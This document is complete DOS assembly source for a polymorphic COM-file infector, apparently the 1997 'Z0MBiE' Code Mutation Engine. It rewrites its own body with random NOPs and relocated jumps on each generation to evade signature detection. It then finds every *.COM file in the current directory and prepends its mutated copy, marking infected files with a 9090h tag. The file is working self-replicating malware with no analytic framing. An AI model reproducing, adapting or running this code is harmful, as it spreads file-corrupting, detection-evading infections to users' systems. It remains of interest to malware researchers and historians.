
viriisize       equ     16384

msg             macro   text
                  local   t3
                  t4      = 0
                  irpc    x, <text>
                    t3      = "&x&"
                    if      t3 ne "'"
                      mov     al, t3
                      stosb
                    endif
                  endm ; irpc
                endm ; macro

msg1310         macro   text
                msg     text
                mov     ax, 0A0Dh
                stosw
                mov     al, '$'
                stosb
                endm

msg0            macro   text
                msg     text
                xor     al, al
                stosb
                endm

include         rulez.inc
include         jmps386.inc

P               equ     5       ; если rnd(P) = 0 то добавить JMPxx
Q               equ     3       ; кол-во NOPов после каждой команды = rnd(Q)

                org     100h
start:
                mov     ax, cs
                mov     bx, ax
                add     ax, 1000h
                mov     es, ax

                mov     si, 100h
                mov     di, si

                mov     cx, viriisize / 4
                cld
                rep     movsd

                push    es

                cmc
                push    offset innewseg
                retf

innewseg:       mov     ss, ax

                mov     es, bx
                mov     si, 100h + viriisize
                mov     di, 100h
                mov     cx, 65536-256-viriisize
                rep     movsb

                mov     ds, ax
                mov     es, ax

                lea     di, vars
                msg1310 'ZCME  0.01  Z0MBiE`s Code Mutation Engine  (c) 1997'

RESTART:        xor     sp, sp

                lea     di, vars
                mov     cx, 32768
                xor     al, al
                cld
                rep     stosb

; ---------------------------------------------------------------------------

mutation:       lea     si, start
                lea     di, newcode
                xor     bx, bx

                mov     ax, 9090h               ; <-- ID
                stosw

                push    -1

@@1:            mov     ax, [si]

                cmp     al, 90h
                jne     @@5

                inc     si
                jmp     @@1

@@5:            cmp     al, 0E9h
                jne     @@3

                add     si, [si+1]
                add     si, 3

@@3:            call    getcmdsize

                push    si              ; старый оффсет
                push    di              ; новый  оффсет

                mov     ax, [si]

                rep     movsb

                inc     ax
                jz      @@exit

               ; cmp     ds:[0080h].b0, 0
               ; jne     @@1

                mov      ax, Q
                call     rnd
                xchg     cx, ax
                jcxz     @@4

                mov      al, 90h
                rep      stosb

@@4:            cmp     di, offset newcode + 8192 - 50
                ja      @@2

                push    di
                mov     cx, 40
                xor     al, al
                repe    scasb
                pop     di
                jne     @@2

                mov      ax, P
                call     rnd
                or       ax, ax
                jnz      @@1

@@2:            mov     ax, 8192 - 50
                call    rnd
                add     ax, offset newcode
                mov     dx, ax

                push    di
                xchg    di, ax
                mov     cx, 40+10
                xor     al, al
                repe    scasb
                pop     di
                jne     @@2

                add     dx, 10

                mov     al, 0E9h
                stosb
                mov     ax, dx
                sub     ax, di
                dec     ax
                dec     ax
                stosw

                mov     di, dx

                jmp     @@1

@@exit:

; ---------------------------------------------------------------------------

               ; mov     ds:[00F0H], di
                mov     ds:[00F0H].w0, offset newcode + 8192

; ---------------------------------------------------------------------------

correctjmps:

@@1:            pop     di              ; новый  оффсет

                inc     di              ; -1
                jz      @@exit
                dec     di

                pop     si              ; старый оффсет

                call    check_jmp

                jmp     @@1

@@exit:

; ---------------------------------------------------------------------------

                call    infectdir

                mov     ah, 62h
                int     21h

                mov     ds, bx
                mov     es, bx
                mov     ss, bx

                xor     sp, sp
                push    sp

                push    ds
                mov     si, 100h
                push    si
                retf

; ---------------------------------------------------------------------------

infectdir:      lea     di, comfiles
                msg0    '*.COM'

                mov     ah, 2fh
                int     21h
                push    es
                push    bx

                mov     ah, 1ah
                lea     dx, mydta
                int     21h

                mov     ah, 4eh
                mov     cx, 1+2+4+32
                lea     dx, comfiles
findnext:       int     21h
                jc      @@exit

                lea     dx, mydta.dta_name
                call    infectfile

                mov     ah, 4fh
                jmp     findnext

@@exit:         mov     bx, ds
                mov     ah, 1ah
                pop     dx
                pop     ds
                int     21h
                mov     ds, bx

                ret

; ---------------------------------------------------------------------------

infectfile:     mov     bp, cs
                add     bp, 1000h

                mov     ax, 3d02h
                int     21h
                jc      @@exit

                xchg    bx, ax

                mov     ah, 3fh
                mov     ds, bp
                mov     dx, 100h
                mov     cx, 65536-256-2-viriisize
                int     21h
                cmp     ax, cx
                je      @@close

                mov     si, ax

                mov     ax, ds:[100h]
                cmp     ax, 'MZ'
                je      @@close
                cmp     ax, 'ZM'
                je      @@close
                cmp     ax, 9090h       ; <-- ID
                je      @@close

                mov     ax, 4200h
                cwd
                xor     cx, cx
                int     21h

                mov     ah, 40h
                mve     ds, cs
                lea     dx, newcode
                mov     cx, viriisize
                int     21h

                mov     ah, 40h
                mve     ds, bp
                mov     dx, 100h
                mov     cx, si
                int     21h

@@close:        mov     ah, 3eh
                int     21h

@@exit:         mve     ds, cs

                ret

; ---------------------------------------------------------------------------

check_jmp:      push    bx

@@1:            dec     bx
                dec     bx
                js      @@exit

                cmp     si, jmpaddr[bx]
                jne     @@1

                mov     bp, jmpcorr[bx]

                cmp     byte ptr cs:[bp - 1], 068h
                je      @@sux1

                mov     ax, di
                sub     ax, bp

                dec     ax
                dec     ax

@@sux2:         mov     cs:[bp], ax

                jmp     @@1

@@exit:         pop     bx
                ret

@@sux1:         mov     ax, di
                sub     ax, newcode - start

                jmp     @@sux2

; ---------------------------------------------------------------------------

                ; input:  si=command
                ; output: cx=command size
                ;         jmpcorr,
                ;         jmpaddr - updated

prefix:         inc     bp
                inc     cx
                jmp     getprefix

getcmdsize:     push    di

                mov     bp, si
                xor     cx, cx

getprefix:      mov     ax, cs:[bp]

                mov     dl, al          ; es: cs: ss: ds:
                and     dl, 11100111b
                cmp     dl, 00100110b
                je      prefix

                mov     dl, al          ; fs: gs: 66 67
                and     dl, 11111100b
                cmp     dl, 01100100b
                je      prefix

                cmp     al, 0f0h        ; lock
                je      prefix

                cmp     al, 0f2h        ; repnz
                je      prefix
                cmp     al, 0f3h        ; repz
                je      prefix

                inc     cx              ; 1

                cmp     al, 0fch        ; cld
                je      @@exit

                mov     dl, al
                and     dl, 0f0h

                cmp     al, 9ah         ; call far xxxx:yyyy
                je      @@9a
                cmp     dl, 90h         ; xchg ax, r16
                je      @@exit          ; cbw cwd wait pushf popf sahf lahf

                cmp     dl, 40h         ; inc r16   dec r16
                je      @@exit

                cmp     dl, 50h         ; push r16  pop r16
                je      @@exit

                cmp     al, 60h         ; pusha
                je      @@exit
                cmp     al, 61h         ; popa
                je      @@exit

                cmp     al, 0c3h        ; ret
                je      @@exit
                cmp     al, 0cbh        ; retf
                je      @@exit
                cmp     al, 0c9h        ; leave
                je      @@exit
                cmp     al, 0cfh        ; iret
                je      @@exit

                mov     dl, al
                and     dl, 11111100b

                cmp     dl, 10100100b   ; movs, cmps
                je      @@exit

                cmp     dl, 10101100b   ; lods, scas
                je      @@exit

                cmp     al, 0AAh        ; stosb
                je      @@exit
                cmp     al, 0ABh        ; stosw
                je      @@exit

                cmp     al, 06h         ; push es
                je      @@exit
                cmp     al, 1eh         ; push ds
                je      @@exit
                cmp     al, 0eh         ; push cs
                je      @@exit
                cmp     al, 1fh         ; pop ds
                je      @@exit

                cmp     al, 0CCh        ; int 3
                je      @@exit

                cmp     al, 0f8h        ; clc
                je      @@exit
                cmp     al, 0f9h        ; stc
                je      @@exit

                inc     cx              ; 2

                cmp     ax, 0ffffh
                je      @@exit

                mov     dx, ax          ; mov sr, r16   mov r16, sr
                and     dx, 1100000011111101b
                cmp     dx, 1100000010001100b
                je      @@exit

                cmp     al, 6Ah         ; push ssxx
                je      @@exit

                mov     dx, ax          ; mov r, r
                and     dx, 1100000011111100b
                cmp     dx, 1100000010001000b
                je      @@exit          ;

                mov     dx, ax          ; add/or/adc/sbb/and/sub/xor/cmp r,r
                and     dx, 1100000011000100b
                cmp     dx, 1100000000000000b
                je      @@exit

                mov     dl, al          ; mov r8, xx
                and     dl, 11111000b
                cmp     dl, 10110000b
                je      @@exit

                mov     dx, ax          ; ror/rol,... reg,1/cl
                and     dx, 1100000011111100b
                cmp     dx, 1100000011010000b
                je      @@exit

                cmp     al, 0cdh        ; int xx
                je      @@exit

                cmp     al, 0A8h        ; test al, xx
                je      @@exit

                cmp     ax, 8A05h       ; mov al, [di]
                je      @@exit
                cmp     ax, 058Bh       ; mov ax, [di]
                je      @@exit
                cmp     ax, 048Bh       ; mov ax, [si]
                je      @@exit
                cmp     ax, 048ah       ; mov al, [si]
                je      @@exit

                cmp     al, 03Ch        ; cmp al, xx
                je      @@exit
                cmp     al, 034h        ; xor al, xx
                je      @@exit
                cmp     al, 004h        ; add al, xx
                je      @@exit
                cmp     al, 02ch        ; sub al, xx
                je      @@exit

                cmp     al, 0E4h        ; in al, xx
                je      @@exit

                cmp     ax, 0F3F7H      ; div bx
                je      @@exit

                inc     cx              ; 3

                cmp     ax, 4c8bh       ; mov cx, [si+xx]
                je      @@exit

                cmp     ax, 7403h       ; add si, [si+xx]
                je      @@exit

                mov     dx, ax          ; add r16, xx
                and     dh, 11000000b
                cmp     dx, 0c083h
                je      @@exit

                cmp     al, 03Dh        ; cmp ax, xxxx
                je      @@exit
                cmp     al, 005h        ; add ax, xxxx
                je      @@exit
                cmp     al, 02dh        ; sub ax, xxxx
                je      @@exit

                mov     dx, ax          ; add/or/adc/sbb/and/sub/xor/cmp r8,xx
                and     dh, 11000000b
                cmp     dx, 1100000010000000b
                je      @@exit

                cmp     al, 0A9h        ; test ax, xxxx
                je      @@exit

                cmp     al, 0e8h        ; call xxxx
                je      @@jmp2

                mov     dl, al          ; mov r16, xxxx
                and     dl, 11111000b
                cmp     dl, 10111000b
                je      @@exit

                mov     dl, al          ; mov al, [xxxx]  mov [xxxx], al
                and     dl, 11111100b   ; mov ax, [xxxx]  mov [xxxx], ax
                cmp     dl, 10100000b
                je      @@exit

                cmp     ax, 04688h      ; mov [bp+xx], al
                je      @@exit
                cmp     ax, 04689h      ; mov [bp+xx], ax
                je      @@exit
                cmp     ax, 0468Ah      ; mov al, [bp+xx]
                je      @@exit
                cmp     ax, 0468Bh      ; mov ax, [bp+xx]
                je      @@exit

                inc     cx              ; 4

                cmp     ax, 7e80h       ; cmp byte ptr [bp+xx], yy
                je      @@exit
                cmp     ax, 858dh       ; lea ax, [di+xxxx]
                je      @@exit

                cmp     ax, 068f5h      ; cmc | push offset xxxx
                je      @@xxx3

                mov     dx, ax          ; add/or/adc/sbb/and/sub/xor/cmp r16,xxxx
                and     dh, 11000000b
                cmp     dx, 1100000010000001b
                je      @@exit

                mov     dx, ax                  ; mov [xxxx], r
                and     dx, 1100011111111101b   ; mov r, [xxxx]
                cmp     dx, 0000011010001001b
                je      @@exit

                cmp     ax, 0B73BH      ; cmp si, [bx+xxxx]
                je      @@exit
                cmp     ax, 0AF8BH      ; mov bp, [bx+xxxx]
                je      @@exit

                cmp     al, 0fh         ; jcc xxxx
                jne     @@1
                mov     dl, ah
                and     dl, 0f0h
                cmp     dl, 80h
                je      @@jmp3
@@1:
                cmp     ax, 0BF89h      ; mov [bx+xxxx], di
                je      @@exit
                cmp     ax, 08789h      ; mov [bx+xxxx], ax
                je      @@exit

                inc     cx              ; 5

                cmp     al, 0eah
@@9a:           je      @@exit

                cmp     ax, 3E80h       ; cmp [xxxx], yy
                je      @@exit

                inc     cx              ; 6

                cmp     ax, 06C7h       ; mov [xxxx], yyyy
                je      @@exit

                inc     cx              ; 7

                int 3

@@xxx3:         ; cmc | push offset xxxx

                inc     di
                inc     di
                mov     ax, cs:[bp+2]
                mov     jmpcorr[bx], di

                jmp     @@sux
                ret

@@jmp3:         inc     di              ; CC CC xxxx
                mov     ax, cs:[bp+2]
                jmp     @@jmp

@@jmp2:         mov     ax, cs:[bp+1]   ; CC xxxx

@@jmp:          inc     di
                mov     jmpcorr[bx], di

                add     ax, bp
                add     ax, cx

@@sux:          mov     jmpaddr[bx], ax

                inc     bx
                inc     bx

@@exit:         pop     di
                ret

; ---------------------------------------------------------------------------

random:         push    bx
                in      al, 40h
                xor     bl, al
                in      al, 40h
                add     bh, al
                in      al, 41h
                sub     bl, al
                in      al, 41h
                xor     bh, al
                in      al, 42h
                add     bl, al
                in      al, 42h
                sub     bh, al
                xchg    bx, ax
                pop     bx
                test    al, 1
                ret

rnd:            push    bx
                push    dx
                xchg    bx, ax
                call    random
                xor     dx, dx
                div     bx
                xchg    dx, ax
                pop     dx
                pop     bx
                test    al, 1
                ret

; ---------------------------------------------------------------------------

                dw      -1              ; eov

; ---------------------------------------------------------------------------

                org     viriisize + 100h

                mov     ax, 4c00h
                int     21h

vars:

jmpcorr         dw      1024 dup (?)
jmpaddr         dw      1024 dup (?)

newcode         db      8192 dup (?)

comfiles        db        32 dup (?)
mydta           dta_struc ?

                end     start
